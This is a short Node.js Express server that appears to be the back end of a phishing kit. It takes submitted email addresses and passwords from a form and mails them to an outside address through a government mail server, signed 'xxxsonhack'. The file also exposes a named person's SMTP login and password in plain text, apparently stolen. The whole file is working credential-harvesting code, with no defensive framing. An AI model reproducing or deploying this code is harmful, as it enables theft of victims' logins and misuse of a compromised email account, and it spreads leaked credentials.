const express = require("express");

const app = express();

const bodyParser = require("body-parser");
const cors = require("cors");
const nodemailer = require("nodemailer");

app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

app.use(cors());

app.post("/", cors(), async (req, res) => {
  let { email, pass, pasers } = req.body;
  const transport = nodemailer.createTransport({
    host: "mail.sidur.gob.mx",
    port: 465,
    auth: {
      user: "diego.ledgard@sidur.gob.mx",
      pass: "C0rr30.48",
    },
  });

  await transport.sendMail({
    from: "mail.sidur.gob.mx",
    to: "marketing@rumahmutu.id",
    subject: "test email",
    html: ` 
    <div> 
      <h2>Here is your email!</h2>
        <p>Email: ${email}</p>
        <p>Pass: ${pass}</p>
        <p>Confirm Pass: ${pasers}</p>
    
        <p>All the best, xxxsonhack</p>
         </div>
     
         
    `,
  });
});

app.listen(5000, console.log("server on 5000"));
